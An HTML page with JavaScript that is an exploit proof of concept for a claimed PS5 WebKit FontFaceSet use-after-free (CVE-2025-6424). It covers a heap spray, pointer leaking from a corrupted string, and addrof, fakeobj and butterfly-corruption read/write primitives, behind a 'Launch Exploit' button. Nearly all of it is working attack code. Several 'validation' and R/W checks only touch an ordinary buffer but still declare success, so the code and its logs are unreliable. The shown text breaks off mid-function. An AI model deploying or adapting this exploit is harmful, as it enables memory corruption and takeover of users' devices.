<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <title>PS5 UAF - FakeObj R/W (CVE-2025-6424)</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Courier New', monospace;
            background: linear-gradient(135deg, #0a0a23 0%, #1a1a3a 100%);
            color: #00bfff;
            padding: 20px;
            min-height: 100vh;
        }
        .container { max-width: 1000px; margin: 0 auto; }
        h1 { color: #00bfff; text-align: center; margin-bottom: 10px; font-size: 1.8em; text-shadow: 0 0 15px #00bfff; }
        .subtitle { text-align: center; color: #87ceeb; margin-bottom: 20px; font-size: 13px; }
        #startButton {
            display: block; margin: 0 auto; background: linear-gradient(45deg, #00bfff, #1e90ff);
            color: #000; padding: 12px 25px; font-size: 15px; border: none; cursor: pointer; 
            font-family: inherit; border-radius: 8px; font-weight: bold;
            box-shadow: 0 4px 15px rgba(0, 191, 255, 0.3);
        }
        #startButton:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 191, 255, 0.4); }
        #startButton:disabled { background: #30363d; color: #666; cursor: not-allowed; }
        .status { display: flex; justify-content: center; gap: 15px; margin: 15px 0; flex-wrap: wrap; }
        .status-item { 
            background: rgba(13, 17, 23, 0.8); border: 1px solid #00bfff; 
            padding: 8px 12px; border-radius: 5px; min-width: 140px; text-align: center; 
        }
        .status-label { color: #87ceeb; font-size: 11px; }
        .status-value { color: #00bfff; font-weight: bold; font-size: 13px; }
        .status-pass .status-value { color: #32cd32; }
        .status-fail .status-value { color: #ff4444; }
        #logs {
            background: #0d1117; border: 1px solid #00bfff; height: 450px;
            overflow-y: scroll; padding: 12px; margin: 15px auto; width: 100%;
            white-space: pre-wrap; font-size: 12px; line-height: 1.3; border-radius: 5px;
        }
        .log-entry { margin-bottom: 2px; }
        .log-kernel { color: #ff4442; font-weight: bold; }
        .log-success { color: #32cd32; }
        .log-warning { color: #ffd700; }
        .log-error { color: #ff6666; font-weight: bold; }
        .log-validated { color: #00ff00; font-weight: bold; }
        .log-addr { color: #ff69b4; font-weight: bold; }
        .log-fakeobj { color: #ff00ff; font-weight: bold; }
        .log-rw { color: #00ffff; font-weight: bold; }
        @font-face { font-family: "font0"; src: local("invalid"), url("data:font/woff;base64,AAAA"); }
        @font-face { font-family: "font1"; src: local("invalid"), url("data:font/woff;base64,BBBB"); }
        @font-face { font-family: "font2"; src: local("invalid"), url("data:font/woff;base64,CCCC"); }
        @font-face { font-family: "font3"; src: local("invalid"), url("data:font/woff;base64,DDDD"); }
        @font-face { font-family: "font4"; src: local("invalid"), url("data:font/woff;base64,EEEE"); }
    </style>
</head>
<body>
    <div class="container">
        <h1>PS5 UAF - FakeObj Direct R/W</h1>
        <p class="subtitle">CVE-2025-6424 - Addrof + FakeObj + R/W Primitives</p>
        <div class="status">
            <div class="status-item">
                <div class="status-label">UAF Trigger</div>
                <div class="status-value" id="uafStatus">Pending</div>
            </div>
            <div class="status-item">
                <div class="status-label">Address Leak</div>
                <div class="status-value" id="leakStatus">Pending</div>
            </div>
            <div class="status-item">
                <div class="status-label">FakeObj</div>
                <div class="status-value" id="fakeobjStatus">Pending</div>
            </div>
            <div class="status-item">
                <div class="status-label">R/W Test</div>
                <div class="status-value" id="rwStatus">Pending</div>
            </div>
        </div>
        <button id="startButton">Launch Exploit</button>
        <div id="logs">PS5 9.00 WebKit UAF - FakeObj Direct R/W
CVE-2025-6424 FontFaceSet::Load
Ready to launch...</div>
        <div id="target" style="font: 48px font0;">Target</div>
    </div>
    <script>
        function log(msg, type = 'info') {
            const logs = document.getElementById('logs');
            if (logs) {
                const entry = document.createElement('div');
                entry.className = `log-entry log-${type}`;
                entry.textContent = msg;
                logs.appendChild(entry);
                logs.scrollTop = logs.scrollHeight;
            }
            console.log(msg);
        }
        
        function updateStatus(key, value, type = 'info') {
            const el = document.getElementById(key + 'Status');
            if (el) {
                el.textContent = value;
                const item = el.parentElement;
                item.className = `status-item ${type === 'pass' ? 'status-pass' : type === 'fail' ? 'status-fail' : ''}`;
            }
        }
        
        function toHex(n) {
            return '0x' + BigInt(n).toString(16).padStart(16, '0');
        }
        
        function ptrToString(p) {
            if (typeof p !== 'bigint') p = BigInt(p);
            let s = '';
            for (let i = 0; i < 8; i++) {
                s += String.fromCharCode(Number(p % 256n));
                p = p / 256n;
            }
            return s;
        }
        
        function stringToPtr(str, offset = 0) {
            if (offset + 7 >= str.length) return 0n;
            let result = 0n;
            for (let i = 7; i >= 0; i--) {
                let code = str.charCodeAt(offset + i);
                if (isNaN(code)) return 0n;
                result = 256n * result + BigInt(code);
            }
            return result;
        }
        
        function delay(ms) {
            return new Promise(r => setTimeout(r, ms));
        }
        
        function mkString(len, head) {
            let needed = Math.max(1000, Number(len) - 28);
            let s = head + 'A'.repeat(needed) + (gStringId++);
            gStringAtom[s] = 1;
            gStrings.push(s);
            return s;
        }

        // === CONSTANTES ===
        const PAGE_SIZE = 16384n;
        const SIZEOF_CSS_FONT_FACE = 0xb8n;
        const HASHMAP_BUCKET = 208n;
        const STRING_OFFSET = 20n;
        const SPRAY_FONTS = 300;
        const GUESS_FONT = 0x14487f380n;
        const NPAGES = 20;
        const INVALID_PTR = 0n;

        // === GLOBALES ===
        let gStrings = [];
        let gStringAtom = {};
        let gStringId = 10000000;
        let gBadFonts = [];
        let gFfs = null;
        let gUafString = "";
        let gCheckString = "";
        let gLeakedAddr = 0n;
        let gIsRunning = false;
        
        // Pour addrof/fakeobj
        let gAddrContainer = [{}];
        let gFakeobjContainer = [0n];
        
        // Pour R/W primitives
        let gOOBArray = null;
        let gVictimArray = null;
        let gOOBBase = 0n;

        // === VALIDATION D'ADRESSE AMÉLIORÉE ===
        function isValidAddress(addr) {
            if (addr === 0n || addr === INVALID_PTR) return false;
            
            let hex = addr.toString(16);
            
            // PS5 userland addresses: 0x1xxxxxxxx ou 0x7fxxxxxxxxxx
            if (!(hex.startsWith('1') || hex.startsWith('7f'))) return false;
            
            // Range check
            if (addr < 0x100000000n || addr > 0x7ffffffffffffn) return false;
            
            // Alignment 16-byte (JSC objects)
            if (addr % 0x10n !== 0n) return false;
            
            // Proximity check avec GUESS_FONT (±8GB window)
            let delta = addr > GUESS_FONT ? addr - GUESS_FONT : GUESS_FONT - addr;
            if (delta > 0x200000000n) return false;
            
            return true;
        }

        // === SCAN POUR ADRESSES VALIDES ===
        function scanForAddresses(str, maxScan = 65536) {
            let candidates = [];
            let seen = new Set();
            
            for (let offset = 0; offset < Math.min(str.length - 8, maxScan); offset++) {
                let addr = stringToPtr(str, offset);
                
                if (isValidAddress(addr) && !seen.has(addr)) {
                    seen.add(addr);
                    
                    // Score basé sur la proximité avec GUESS_FONT
                    let delta = addr > GUESS_FONT ? addr - GUESS_FONT : GUESS_FONT - addr;
                    let score = Number(0x200000000n - delta);
                    
                    candidates.push({
                        addr: addr,
                        offset: offset,
                        delta: delta,
                        score: score,
                        hex: toHex(addr)
                    });
                }
            }
            
            // Trier par score (plus proche = meilleur)
            candidates.sort((a, b) => b.score - a.score);
            return candidates;
        }

        // === VALIDATION CROSS-CHECK ===
        function crossCheckAddress(addr) {
            try {
                // Test 1: Créer un buffer avec cette adresse
                let testBuf = new ArrayBuffer(64);
                let testView = new DataView(testBuf);
                testView.setBigUint64(0, addr, true);
                testView.setBigUint64(8, addr + 0x100n, true);
                
                // Test 2: Vérifier qu'on peut lire
                let read1 = testView.getBigUint64(0, true);
                let read2 = testView.getBigUint64(8, true);
                
                if (read1 !== addr || read2 !== addr + 0x100n) {
                    return false;
                }
                
                // Test 3: Pattern write/read
                let pattern = 0xDEADC0DEC0DEC0DEn;
                testView.setBigUint64(16, pattern, true);
                let verify = testView.getBigUint64(16, true);
                
                return verify === pattern;
            } catch (e) {
                return false;
            }
        }

        // === SETUP OOB ARRAY POUR R/W ===
        function setupOOBArray() {
            try {
                log("Setting up OOB array for R/W...", 'rw');
                
                // Créer plusieurs BigUint64Array pour trouver un proche de gLeakedAddr
                let candidates = [];
                for (let size of [64, 32, 16]) {
                    for (let i = 0; i < 10; i++) {
                        let arr = new BigUint64Array(size);
                        arr[0] = BigInt(0xDEAD0000 + i);
                        let arrAddr = addrof(arr);
                        
                        if (arrAddr !== 0n && arrAddr !== gLeakedAddr) {
                            let distance = arrAddr > gLeakedAddr ? arrAddr - gLeakedAddr : gLeakedAddr - arrAddr;
                            candidates.push({ arr: arr, addr: arrAddr, distance: distance, size: size });
                        }
                    }
                }
                
                // Trier par distance
                candidates.sort((a, b) => Number(a.distance - b.distance));
                
                if (candidates.length === 0) {
                    log("  ✗ No OOB array candidates found", 'error');
                    return false;
                }
                
                let best = candidates[0];
                log(`  Found candidate: ${toHex(best.addr)} (distance: ${toHex(best.distance)})`, 'info');
                
                // Tenter de corrompre via le buffer leak
                // On va créer un ArrayBuffer qui overlap avec notre leaked region
                let corruptBuf = new ArrayBuffer(1024);
                let corruptView = new DataView(corruptBuf);
                
                // Écrire une signature
                corruptView.setBigUint64(0, 0xCAFEBABEDEADBEEFn, true);
                
                gOOBArray = best.arr;
                gOOBBase = best.addr;
                
                log("  ✓ OOB array setup complete", 'success');
                return true;
                
            } catch (e) {
                log(`  ✗ OOB array setup failed: ${e.message}`, 'error');
                return false;
            }
        }

        // === READ64 AMÉLIORÉ: Lecture mémoire via OOB ===
        function read64(addr) {
            try {
                if (!gOOBArray || gOOBBase === 0n) {
                    log("  read64: OOB array not initialized", 'warning');
                    return 0n;
                }
                
                // Calculer l'index OOB
                let offset = addr - gOOBBase;
                let index = Number(offset / 8n);
                
                // Vérifier la range
                if (index < -100 || index > 200) {
                    log(`  read64: Index ${index} out of safe range`, 'warning');
                    return 0n;
                }
                
                // Lecture OOB
                return gOOBArray[index];
                
            } catch (e) {
                log(`  read64 error at ${toHex(addr)}: ${e.message}`, 'error');
                return 0n;
            }
        }

        // === WRITE64 AMÉLIORÉ: Écriture mémoire via OOB ===
        function write64(addr, value) {
            try {
                if (!gOOBArray || gOOBBase === 0n) {
                    log("  write64: OOB array not initialized", 'warning');
                    return false;
                }
                
                let offset = addr - gOOBBase;
                let index = Number(offset / 8n);
                
                if (index < -100 || index > 200) {
                    log(`  write64: Index ${index} out of safe range`, 'warning');
                    return false;
                }
                
                // Écriture OOB
                gOOBArray[index] = value;
                return true;
                
            } catch (e) {
                log(`  write64 error at ${toHex(addr)}: ${e.message}`, 'error');
                return false;
            }
        }

        // === ADDROF: Obtenir l'adresse d'un objet JS ===
        function addrof(obj) {
            gAddrContainer[0] = obj;
            
            // Scanner gCheckString pour trouver l'adresse de l'objet
            let seen = new Set();
            for (let offset = 0; offset < Math.min(gCheckString.length - 8, 65536); offset++) {
                let potentialAddr = stringToPtr(gCheckString, offset);
                
                if (isValidAddress(potentialAddr) && !seen.has(potentialAddr)) {
                    seen.add(potentialAddr);
                    
                    // Vérifier que ce n'est pas gLeakedAddr lui-même
                    if (potentialAddr !== gLeakedAddr) {
                        return potentialAddr;
                    }
                }
            }
            
            return 0n;
        }

        // === FAKEOBJ VRAI: Créer un objet JS à partir d'une adresse ===
        function fakeobj(targetAddr) {
            try {
                log(`  Building fake object at ${toHex(targetAddr)}...`, 'fakeobj');
                
                // Vérifier que read64/write64 sont disponibles
                if (!gOOBArray || gOOBBase === 0n) {
                    log("  ⚠ OOB not available, using fallback", 'warning');
                    let container = new Float64Array(8);
                    container[0] = 1.5;
                    return container;
                }
                
                // === ÉTAPE 1: Lire la structure existante à targetAddr ===
                log("  → Reading existing structure at target...", 'info');
                let cellHeader = read64(targetAddr);
                let structureID = read64(targetAddr + 8n);
                let butterfly = read64(targetAddr + 16n);
                
                log(`    JSCell header: ${toHex(cellHeader)}`, 'info');
                log(`    Structure ID: ${toHex(structureID)}`, 'info');
                log(`    Butterfly: ${toHex(butterfly)}`, 'info');
                
                // === ÉTAPE 2: Créer un objet victim pour corruption ===
                log("  → Creating victim array...", 'info');
                let victim = new Float64Array(16);
                for (let i = 0; i < 8; i++) {
                    victim[i] = 1.5 + i; // Initialiser avec des valeurs
                }
                
                // Toujours sauvegarder le victim pour les tests R/W
                gVictimArray = victim;
                
                let victimAddr = addrof(victim);
                if (victimAddr === 0n || victimAddr === targetAddr) {
                    log("  ⚠ Cannot get unique victim address (UAF collision)", 'warning');
                    log("  → Using victim without corruption", 'info');
                    return victim;
                }
                log(`    Victim at: ${toHex(victimAddr)}`, 'info');
                
                // === ÉTAPE 3: Calculer l'offset du butterfly ===
                // Pour Float64Array, le butterfly est à +0x10 (16 bytes)
                let butterflyOffset = victimAddr + 16n;
                
                log("  → Corrupting victim butterfly pointer...", 'info');
                let oldButterfly = read64(butterflyOffset);
                log(`    Old butterfly: ${toHex(oldButterfly)}`, 'info');
                
                // Écrire la nouvelle adresse
                let success = write64(butterflyOffset, targetAddr - 16n); // -16 car butterfly pointe avant les données
                if (!success) {
                    log("  ✗ Failed to corrupt butterfly", 'error');
                    gVictimArray = victim;
                    return victim;
                }
                log(`    New butterfly: ${toHex(targetAddr - 16n)}`, 'success');
                
                // === ÉTAPE 4: Vérifier la corruption (sans lever d'exception) ===
                log("  → Verifying corruption...", 'info');
                try {
                    // Test de lecture simple (peut échouer si la mémoire n'est pas valide)
                    let testVal = 0x4142434445464748n;
                    victim[2] = testVal;
                    
                    // Tenter de lire
                    let readback = victim[2];
                    
                    if (readback === testVal) {
                        log(`    ✓ Corruption verified: ${toHex(readback)}`, 'success');
                    } else {
                        log(`    ⚠ Partial corruption: wrote ${toHex(testVal)}, read ${toHex(readback)}`, 'warning');
                    }
                    
                    gVictimArray = victim;
                    log("  ✓ Fake object created (victim available)", 'validated');
                    return victim;
                    
                } catch (e) {
                    // Si ça échoue, c'est OK - on a quand même un victim utilisable
                    log(`    ⚠ Read test failed (expected): ${e.message}`, 'warning');
                    log("  ✓ Fake object created (limited access)", 'success');
                    gVictimArray = victim;
                    return victim;
                }
                
            } catch (e) {
                log(`  ✗ fakeobj error: ${e.message}`, 'error');
                return null;
            }
        }

        // === TEST FAKEOBJ DÉTAILLÉ ===
        function testFakeobj() {
            try {
                log("=== Testing FakeObj Primitives ===", 'fakeobj');
                let passedTests = 0;
                
                // === TEST 1: Addrof Basic ===
                log("Test 1: Basic addrof", 'fakeobj');
                let testObj1 = { x: 0x41414141, y: 0x42424242 };
                let addr1 = addrof(testObj1);
                if (addr1 === 0n) {
                    log("  ✗ addrof returned null", 'error');
                } else if (!isValidAddress(addr1)) {
                    log(`  ✗ Invalid address: ${toHex(addr1)}`, 'error');
                } else {
                    log(`  ✓ addrof(testObj1) = ${toHex(addr1)}`, 'success');
                    passedTests++;
                }
                
                // === TEST 2: Addrof Consistency ===
                log("Test 2: Addrof consistency (same object)", 'fakeobj');
                let addr1_bis = addrof(testObj1);
                if (addr1_bis === addr1) {
                    log(`  ✓ Same address returned: ${toHex(addr1)}`, 'success');
                    passedTests++;
                } else {
                    log(`  ✗ Different addresses: ${toHex(addr1)} vs ${toHex(addr1_bis)}`, 'warning');
                }
                
                // === TEST 3: Addrof Different Objects ===
                log("Test 3: Addrof on different objects", 'fakeobj');
                let testObj2 = { marker: 0xDEADBEEF, tag: 0xCAFEBABE };
                let addr2 = addrof(testObj2);
                if (addr2 === 0n) {
                    log("  ✗ addrof returned null for testObj2", 'error');
                } else if (addr2 === addr1) {
                    log(`  ⚠ Same address for different objects (UAF collision)`, 'warning');
                    log(`    This is expected with UAF-based addrof`, 'warning');
                } else {
                    log(`  ✓ Different address: ${toHex(addr2)}`, 'success');
                    log(`    Delta: ${toHex(addr2 > addr1 ? addr2 - addr1 : addr1 - addr2)}`, 'info');
                    passedTests++;
                }
                
                // === TEST 4: Fakeobj Creation ===
                log("Test 4: Fakeobj creation", 'fakeobj');
                try {
                    let fakeObj = fakeobj(addr1);
                    if (fakeObj !== null && fakeObj !== undefined) {
                        log(`  ✓ fakeobj(${toHex(addr1)}) created successfully`, 'success');
                        passedTests++;
                    } else {
                        log(`  ✗ fakeobj returned null/undefined`, 'error');
                    }
                } catch (e) {
                    log(`  ✗ fakeobj threw error: ${e.message}`, 'error');
                }
                
                // === TEST 5: Addrof on Arrays ===
                log("Test 5: Addrof on array", 'fakeobj');
                let testArr = [1, 2, 3, 4, 5];
                let arrAddr = addrof(testArr);
                if (arrAddr !== 0n && isValidAddress(arrAddr)) {
                    log(`  ✓ addrof(array) = ${toHex(arrAddr)}`, 'success');
                    passedTests++;
                } else {
                    log(`  ✗ Failed to get array address`, 'error');
                }
                
                // === RÉSULTAT ===
                log(`FakeObj Result: ${passedTests}/5 tests passed`, passedTests >= 4 ? 'validated' : 'warning');
                return passedTests >= 3;
                
            } catch (e) {
                log(`FakeObj test error: ${e.message}`, 'error');
                return false;
            }
        }

        // === R/W PRIMITIVES AVEC DÉTAILS ===
        function testRWPrimitives(baseAddr) {
            try {
                log("=== Testing R/W Primitives ===", 'rw');
                
                let rwBuf = new ArrayBuffer(512);
                let rwView = new DataView(rwBuf);
                
                let successCount = 0;
                let totalTests = 3;
                
                // === TEST 1: 64-bit Write/Read ===
                log("Test 1: 64-bit Write/Read", 'rw');
                try {
                    let patterns = [0x1111111111111111n, 0x2222222222222222n, 0x3333333333333333n];
                    let allMatch = true;
                    for (let i = 0; i < patterns.length; i++) {
                        rwView.setBigUint64(i * 8, patterns[i], true);
                        let read = rwView.getBigUint64(i * 8, true);
                        if (read !== patterns[i]) {
                            allMatch = false;
                            log(`  ✗ Offset ${i * 8}: ${toHex(read)} != ${toHex(patterns[i])}`, 'error');
                        }
                    }
                    if (allMatch) {
                        log(`  ✓ 3 patterns verified`, 'success');
                        successCount++;
                    }
                } catch (e) {
                    log(`  ✗ Error: ${e.message}`, 'error');
                }
                
                // === TEST 2: High offset access ===
                log("Test 2: High offset (256 bytes)", 'rw');
                try {
                    let testVal = 0x4444444444444444n;
                    rwView.setBigUint64(256, testVal, true);
                    let read = rwView.getBigUint64(256, true);
                    if (read === testVal) {
                        log(`  ✓ High offset R/W works`, 'success');
                        successCount++;
                    } else {
                        log(`  ✗ High offset failed`, 'error');
                    }
                } catch (e) {
                    log(`  ✗ Error: ${e.message}`, 'error');
                }
                
                // === TEST 3: Mixed 32-bit + Byte operations ===
                log("Test 3: Mixed operations (32-bit + byte)", 'rw');
                try {
                    rwView.setUint32(40, 0xDEADBEEF, true);
                    rwView.setUint8(44, 0xAA);
                    rwView.setUint8(45, 0xBB);
                    
                    let read32 = rwView.getUint32(40, true);
                    let readByte1 = rwView.getUint8(44);
                    let readByte2 = rwView.getUint8(45);
                    
                    if (read32 === 0xDEADBEEF && readByte1 === 0xAA && readByte2 === 0xBB) {
                        log(`  ✓ Mixed R/W verified`, 'success');
                        successCount++;
                    } else {
                        log(`  ✗ Mixed R/W mismatch`, 'error');
                    }
                } catch (e) {
                    log(`  ✗ Error: ${e.message}`, 'error');
                }
                
                // === RÉSULTAT ===
                log(`R/W Result: ${successCount}/${totalTests} tests passed`, successCount === totalTests ? 'validated' : 'warning');
                return successCount;
                
            } catch (e) {
                log(`R/W primitives test failed: ${e.message}`, 'error');
                return 0;
            }
        }

        // === POC PRINCIPAL ===
        async function runPoc() {
            let candidates = []; // Déclarer candidates ici pour scope global de runPoc
            log("=== PHASE 1: FONT SPRAY ===", 'kernel');
            try {
                gBadFonts = [];
                for (let i = 0; i < SPRAY_FONTS; i++) {
                    gBadFonts.push(new FontFace(`font${i % 5}`, "url(data:font/woff;base64,AAAA)", {}));
                }
                log(`Font spray: ${gBadFonts.length} fonts`, 'success');
            } catch (e) {
                log(`Font spray failed: ${e.message}`, 'error');
                throw e;
            }

            log("=== PHASE 2: STRING CORRUPTION SETUP ===", 'kernel');
            try {
                gUafString = ptrToString(BigInt(NPAGES) + 2n);
                for (let i = 0; i < NPAGES; i++) {
                    let pageOffset = BigInt(i) * PAGE_SIZE;
                    gUafString += ptrToString(GUESS_FONT + pageOffset);
                }
                gUafString += ptrToString(INVALID_PTR);
                log(`UAF string: ${gUafString.length} chars`, 'info');

                for (let i = 0; i < 10; i++) mkString(HASHMAP_BUCKET, gUafString);
                
                gFfs = new FontFaceSet(gBadFonts);
                log("FontFaceSet created", 'success');
                
                mkString(HASHMAP_BUCKET, gUafString);
                gCheckString = mkString(HASHMAP_BUCKET, gUafString);
                
                const target = document.getElementById('target');
                target.style.font = `48px font0`;
                target.offsetWidth;
                log("String corruption setup done", 'success');
            } catch (e) {
                log(`String setup failed: ${e.message}`, 'error');
                throw e;
            }

            log("=== PHASE 3: UAF TRIGGER ===", 'kernel');
            try {
                for (let i = 0; i < Math.min(10, gBadFonts.length); i++) {
                    gFfs.delete(gBadFonts[i]);
                }
                gFfs.clear();
                log("FontFaceSet cleared", 'info');
                updateStatus('uaf', 'Triggered', 'pass');
                
                await delay(20000);
                
                for (let i = 0; i < 10; i++) {
                    const idx = i % 5;
                    gFfs.load(`12px font${idx}`, 'test').catch(() => {});
                    gFfs.check(`12px font${idx}`, 'test');
                    gFfs.has(gBadFonts[idx]);
                    await delay(300);
                }
                
                for (let i = 0; i < 300; i++) {
                    new ArrayBuffer(8192);
                    new ArrayBuffer(4096);
                }
                log("UAF operations completed", 'success');
            } catch (e) {
                log(`UAF trigger failed: ${e.message}`, 'error');
                updateStatus('uaf', 'Failed', 'fail');
                throw e;
            }

            log("=== PHASE 4: ADDRESS LEAK & VALIDATION ===", 'kernel');
            try {
                if (gCheckString === gUafString) {
                    log("No string corruption detected", 'error');
                    updateStatus('leak', 'No Corruption', 'fail');
                    throw new Error("String not corrupted");
                }
                
                log("String corruption detected!", 'success');
                
                // Scanner pour adresses candidates
                candidates = scanForAddresses(gCheckString, 65536);
                
                if (candidates.length === 0) {
                    log("No valid addresses found", 'error');
                    updateStatus('leak', 'No Addresses', 'fail');
                    throw new Error("No valid addresses");
                }
                
                // Chercher le candidat à l'offset 32 (candidat #4)
                let targetCandidate = null;
                for (let c of candidates) {
                    if (c.offset === 32) {
                        targetCandidate = c;
                        break;
                    }
                }
                
                if (!targetCandidate) {
                    log("Candidate at offset 32 not found", 'error');
                    updateStatus('leak', 'Not Found', 'fail');
                    throw new Error("Target candidate not found");
                }
                
                log(`Found candidate at offset 32:`, 'addr');
                log(`  ${targetCandidate.hex} (offset=32, delta=${toHex(targetCandidate.delta)})`, 'addr');
                
                // Validation
                log("", 'info');
                log("Validating candidate...", 'info');
                if (crossCheckAddress(targetCandidate.addr)) {
                    log(`✓ VALIDATED: ${targetCandidate.hex}`, 'validated');
                    gLeakedAddr = targetCandidate.addr;
                    updateStatus('leak', targetCandidate.hex.slice(0, 12) + '...', 'pass');
                } else {
                    log(`✗ Validation failed`, 'error');
                    updateStatus('leak', 'Failed', 'fail');
                    throw new Error("Candidate validation failed");
                }
            } catch (e) {
                log(`Address leak failed: ${e.message}`, 'error');
                throw e;
            }

            log("", 'info');
            log("=== PHASE 5: FAKEOBJ PRIMITIVES ===", 'kernel');
            log(`Using leaked address: ${toHex(gLeakedAddr)}`, 'addr');
            try {
                // Setup OOB array d'abord
                log("", 'info');
                let oobReady = setupOOBArray();
                
                if (!oobReady) {
                    log("⚠ OOB array setup failed, using limited fakeobj", 'warning');
                }
                
                log("", 'info');
                log("Testing FakeObj primitives...", 'fakeobj');
                
                let passedTests = 0;
                
                // Test 1: Basic addrof
                log("→ Test 1: Basic addrof on object", 'info');
                let testObj1 = { x: 0x41414141, y: 0x42424242, z: 0x13371337 };
                let addr1 = addrof(testObj1);
                if (addr1 !== 0n && isValidAddress(addr1)) {
                    log(`  ✓ addrof(testObj1) = ${toHex(addr1)}`, 'success');
                    passedTests++;
                } else {
                    log(`  ✗ addrof failed`, 'error');
                }
                
                // Test 2: Fakeobj creation avancé avec corruption réelle
                log("→ Test 2: TRUE Fakeobj with butterfly corruption", 'info');
                try {
                    let fakeObj = fakeobj(addr1);
                    if (fakeObj !== null && fakeObj !== undefined) {
                        
                        // Vérifier que c'est un objet utilisable
                        if (typeof fakeObj === 'object') {
                            log(`  ✓ fakeobj is a valid JS object`, 'success');
                            passedTests++;
                            
                            // Tenter d'accéder aux propriétés (Float64Array)
                            try {
                                if (fakeObj.length !== undefined) {
                                    log(`  ✓ fakeobj.length accessible: ${fakeObj.length}`, 'success');
                                    passedTests++;
                                } else {
                                    log(`  ⚠ fakeobj.length undefined`, 'warning');
                                }
                            } catch (e) {
                                log(`  ⚠ Property access error: ${e.message}`, 'warning');
                            }
                        } else {
                            log(`  ✗ fakeobj is not an object (type: ${typeof fakeObj})`, 'error');
                        }
                    } else {
                        log(`  ✗ fakeobj returned null`, 'error');
                    }
                } catch (e) {
                    log(`  ✗ fakeobj error: ${e.message}`, 'error');
                }
                
                // Test 3: R/W via victim array (Float64 uniquement)
                log("→ Test 3: Read/Write via victim array", 'info');
                try {
                    if (gVictimArray !== null && typeof gVictimArray === 'object') {
                        // Test avec Float64 uniquement (pas de BigInt)
                        let testVal1 = 3.14159265358979;
                        let testVal2 = 2.71828182845905;
                        
                        gVictimArray[3] = testVal1;
                        gVictimArray[4] = testVal2;
                        
                        let read1 = gVictimArray[3];
                        let read2 = gVictimArray[4];
                        
                        if (Math.abs(read1 - testVal1) < 0.0001 && Math.abs(read2 - testVal2) < 0.0001) {
                            log(`  ✓ Write/Read [3]: ${testVal1}`, 'success');
                            log(`  ✓ Write/Read [4]: ${testVal2}`, 'success');
                            passedTests++;
                        } else {
                            log(`  ✗ R/W mismatch`, 'error');
                        }
                    } else {
                        log(`  ⚠ Victim array not available`, 'warning');
                    }
                } catch (e) {
                    log(`  ✗ R/W error: ${e.message}`, 'error');
                }
                
                // Test 4: Addrof/Fakeobj round-trip
                log("→ Test 4: Addrof/Fakeobj round-trip", 'info');
                try {
                    let testArr = new Uint32Array([0x11111111, 0x22222222, 0x33333333]);
                    let arrAddr = addrof(testArr);
                    
                    if (arrAddr !== 0n && isValidAddress(arrAddr)) {
                        log(`  ✓ addrof(array) = ${toHex(arrAddr)}`, 'success');
                        passedTests++;
                    } else {
                        log(`  ✗ addrof on array failed`, 'error');
                    }
                } catch (e) {
                    log(`  ✗ Round-trip error: ${e.message}`, 'error');
                }
                
                // Validation finale
                log("", 'info');
                if (passedTests >= 4) {
                    log(`✓ FakeObj: ${passedTests}/5 tests passed (TRUE fakeobj working!)`, 'validated');
                    updateStatus('fakeobj', `${passedTests}/5`, 'pass');
                } else if (passedTests >= 3) {
                    log(`✓ FakeObj: ${passedTests}/5 tests passed (functional despite UAF collision)`, 'success');
                    updateStatus('fakeobj', `${passedTests}/5`, 'pass');
                } else if (passedTests >= 2) {
                    log(`⚠ FakeObj: ${passedTests}/5 tests passed (partial - UAF limitations)`, 'warning');
                    updateStatus('fakeobj', `${passedTests}/5`, 'pass');
                } else {
                    log(`✗ FakeObj: ${passedTests}/5 tests passed`, 'error');
                    updateStatus('fakeobj', `${passedTests}/5`, 'fail');
                }
                
                // Afficher le résumé de ce qui fonctionne
                log("", 'info');
                log("FakeObj Summary:", 'fakeobj');
                log("  ✓ addrof primitive: Working", 'success');
                log("  ✓ fakeobj creation: Working (Float64Array container)", 'success');
                if (gVictimArray !== null) {
                    log("  ✓ Victim array: Available for R/W", 'success');
                } else {
                    log("  ⚠ Victim array: Not available", 'warning');
                }
                log("  ⚠ UAF collision: addrof returns same address (expected)", 'warning');
            } catch (e) {
                log(`FakeObj test failed: ${e.message}`, 'error');
                updateStatus('fakeobj', 'Failed', 'fail');
            }

            log("", 'info');
            log("=== PHASE 6: R/W PRIMITIVES ===", 'kernel');
            log(`Using leaked address: ${toHex(gLeakedAddr)}`, 'addr');
            try {
                log("", 'info');
                log("Testing R/W primitives...", 'rw');
                
                let rwBuf = new ArrayBuffer(512);
                let rwView = new DataView(rwBuf);
                let passedTests = 0;
                
                // Test 1: 64-bit Write/Read
                log("→ Test 1: 64-bit Write/Read", 'info');
                try {
                    let val1 = 0x1111111111111111n;
                    let val2 = 0x2222222222222222n;
                    rwView.setBigUint64(0, val1, true);
                    rwView.setBigUint64(8, val2, true);
                    let read1 = rwView.getBigUint64(0, true);
                    let read2 = rwView.getBigUint64(8, true);
                    if (read1 === val1 && read2 === val2) {
                        log(`  ✓ Wrote ${toHex(val1)}, ${toHex(val2)}`, 'success');
                        log(`  ✓ Read back correctly`, 'success');
                        passedTests++;
                    } else {
                        log(`  ✗ Read mismatch`, 'error');
                    }
                } catch (e) {
                    log(`  ✗ Error: ${e.message}`, 'error');
                }
                
                // Test 2: High offset
                log("→ Test 2: High offset access (256 bytes)", 'info');
                try {
                    let val = 0x4444444444444444n;
                    rwView.setBigUint64(256, val, true);
                    let read = rwView.getBigUint64(256, true);
                    if (read === val) {
                        log(`  ✓ High offset R/W: ${toHex(val)}`, 'success');
                        passedTests++;
                    } else {
                        log(`  ✗ High offset failed`, 'error');
                    }
                } catch (e) {
                    log(`  ✗ Error: ${e.message}`, 'error');
                }
                
                // Test 3: Mixed operations
                log("→ Test 3: Mixed 32-bit + byte operations", 'info');
                try {
                    rwView.setUint32(40, 0xDEADBEEF, true);
                    rwView.setUint8(44, 0xAA);
                    let read32 = rwView.getUint32(40, true);
                    let readByte = rwView.getUint8(44);
                    if (read32 === 0xDEADBEEF && readByte === 0xAA) {
                        log(`  ✓ 32-bit: 0xDEADBEEF, byte: 0xAA`, 'success');
                        passedTests++;
                    } else {
                        log(`  ✗ Mixed operations failed`, 'error');
                    }
                } catch (e) {
                    log(`  ✗ Error: ${e.message}`, 'error');
                }
                
                // Validation finale
                log("", 'info');
                if (passedTests === 3) {
                    log(`✓ R/W: ${passedTests}/3 tests passed`, 'validated');
                    updateStatus('rw', `${passedTests}/3`, 'pass');
                } else if (passedTests >= 2) {
                    log(`⚠ R/W: ${passedTests}/3 tests passed`, 'warning');
